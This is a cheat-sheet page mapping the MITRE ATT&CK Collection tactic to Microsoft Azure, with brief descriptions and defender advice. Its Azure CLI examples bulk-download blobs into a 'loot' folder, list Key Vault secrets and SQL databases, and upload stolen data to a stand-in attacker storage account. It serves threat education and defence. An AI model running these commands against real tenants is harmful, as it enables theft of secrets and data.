# Collection TA0009

## **Collection Techniques in Azure Environments**

In Microsoft Azure, adversaries use Collection techniques to **gather sensitive information** once inside the environment.\
This phase involves **harvesting data from storage accounts, databases, repositories**, and **staging it** for exfiltration.

Collection is often **automated** with scripts, Azure CLI, REST APIs, or by pivoting through storage and app services.

***

#### 📥 Automated Collection

\| MITRE ID | **T1119** |

**Description**:\
Adversaries automatically collect data from Azure services (e.g., Storage Accounts, Cosmos DB, SQL Databases) using scripts, CLI tools, API calls, or agentless collection mechanisms.

**Azure Example**:

```bash
bashCopyEditaz storage blob download-batch --account-name victimstorage --destination ./loot --source secrets
```

✅ **Result**: Mass download of blobs/files using Azure CLI or SDKs.

***

#### ☁️ Data from Cloud Storage

\| MITRE ID | **T1530** |

**Description**:\
Harvest data from Azure Blob Storage, Azure Files, Data Lakes, or Storage Shares — especially misconfigured public storage or exposed access keys.

**Azure Example**:

```bash
bashCopyEditaz storage blob list --account-name victimstorage --container-name secrets --output table
```

✅ **Result**: Exfiltration-ready files directly pulled from Azure Storage.

***

#### 🗄️ Data from Information Repositories

\| MITRE ID | **T1213** |

**Description**:\
Steal sensitive data from Azure-hosted databases (SQL DBs, Cosmos DB, Key Vault secrets) or information repositories (App Service settings, Logic Apps).

**Azure Example**:

```bash
bashCopyEditaz sql db list --resource-group victim-rg --server victim-sqlserver
az keyvault secret list --vault-name victimvault
```

✅ **Result**: Access to credentials, application secrets, or sensitive structured data.

***

#### 🗃️ Data Staged → Remote Data Staging

\| MITRE ID | **T1074.002** |

**Description**:\
Move collected data to an attacker-controlled cloud storage account, intermediate Azure resource (e.g., new Storage Account, VM), or externally hosted repository before full exfiltration.

**Azure Example**:

```bash
bashCopyEditaz storage blob upload-batch --destination https://attackerstorage.blob.core.windows.net/staging --source ./loot
```

✅ **Result**: Covertly stage exfiltrated data for later retrieval.

***

## 📊 **Collection Techniques in Azure (MITRE Mapped)**

| Technique/Subtechnique             | MITRE ID  | Azure Example                                            |
| ---------------------------------- | --------- | -------------------------------------------------------- |
| Automated Collection               | T1119     | Mass download of blobs/files using CLI or API            |
| Data from Cloud Storage            | T1530     | Enumerate and steal Azure Blob/Files data                |
| Data from Information Repositories | T1213     | Query Azure SQL, Cosmos DB, Key Vault for secrets        |
| Remote Data Staging                | T1074.002 | Upload loot to external Storage Account for exfiltration |

***

## 🎯 Final Summary

Defending against Collection in Azure focuses on:

* **Securing storage accounts, databases, and repositories with strict access control**
* **Monitoring download and data access anomalies (Defender for Cloud, Sentinel)**
* **Detecting suspicious data staging or movement between subscriptions/storage accounts**
* **Preventing mass data gathering through throttling, logging, and behavior analytics**
